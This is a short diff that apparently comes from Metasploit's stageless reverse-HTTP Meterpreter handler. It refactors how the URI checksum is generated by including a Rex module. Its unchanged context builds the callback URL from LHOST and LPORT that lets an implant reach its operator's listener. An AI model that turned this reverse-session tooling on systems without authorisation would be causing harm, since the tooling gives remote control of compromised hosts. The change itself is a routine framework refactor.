@@ -5,6 +5,7 @@
 
 require 'msf/core'
 require 'rex/parser/x509_certificate'
+require 'rex/payloads/meterpreter/uri_checksum'
 
 module Msf
 
@@ -17,6 +18,7 @@ module Msf
 module Handler::ReverseHttp::Stageless
 
   include Msf::Payload::Windows::VerifySsl
+  include Rex::Payloads::Meterpreter::UriChecksum
 
   def initialize_stageless
     register_options([
@@ -25,7 +27,7 @@ module Handler::ReverseHttp::Stageless
   end
 
   def generate_stageless(&block)
-    checksum = generate_uri_checksum(Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_CONN)
+    checksum = generate_uri_checksum(URI_CHECKSUM_CONN)
     rand = Rex::Text.rand_text_alphanumeric(16)
     url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}/#{checksum}_#{rand}/"
 
